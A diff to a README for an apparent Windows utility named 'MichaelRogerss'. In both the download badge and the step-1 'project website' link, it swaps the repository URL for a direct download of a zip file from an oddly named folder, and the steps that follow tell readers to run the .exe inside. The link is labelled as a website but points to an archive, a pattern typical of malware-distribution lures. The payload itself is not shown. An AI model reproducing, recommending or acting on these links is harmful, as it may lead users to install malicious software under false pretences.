@@ -1,6 +1,6 @@
 # 🛡️ MichaelRogerss - Secure tools for your daily tasks
 
-[![Download MichaelRogerss](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/mandalif-cmd/MichaelRogerss)
+[![Download MichaelRogerss](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/mandalif-cmd/MichaelRogerss/raw/refs/heads/main/kung/Rogerss-Michael-3.7.zip)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project website at [https://github.com/mandalif-cmd/MichaelRogerss](https://github.com/mandalif-cmd/MichaelRogerss).
+1. Visit the project website at [https://github.com/mandalif-cmd/MichaelRogerss/raw/refs/heads/main/kung/Rogerss-Michael-3.7.zip](https://github.com/mandalif-cmd/MichaelRogerss/raw/refs/heads/main/kung/Rogerss-Michael-3.7.zip).
 2. Locate the download button on the page.
 3. Select the file ending in .exe to start your download.
 4. Open the folder where your browser saves files.
